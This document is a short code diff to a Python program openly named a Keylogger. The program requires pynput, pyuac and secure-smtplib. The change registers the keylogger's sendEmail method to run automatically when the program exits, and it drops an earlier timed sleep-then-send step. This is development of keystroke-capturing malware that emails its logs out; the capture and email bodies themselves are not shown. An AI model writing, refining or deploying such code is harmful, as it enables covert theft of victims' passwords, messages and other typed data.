@@ -3,6 +3,7 @@ import os
 import sys
 import shutil
 import time
+import atexit
 requiredModules = ["pynput", "datetime", "pyuac", "secure-smtplib"]
 
 for module in requiredModules:
@@ -27,11 +28,9 @@ class Keylogger:
 
     def __init__(self):
         self.log = "Keylogger started ..."
+        atexit.register(self.sendEmail)
 
     # this are primary methods which ishould be done
-    #
-    #
-    #
     def sendEmail(self):
 
         # email config
@@ -127,8 +126,6 @@ if __name__ == "__main__":
     obj = Keylogger()
     threading.Thread(target=obj.run).start()
 
-    time.sleep(20)
-    obj.sendEmail()
 
         
 
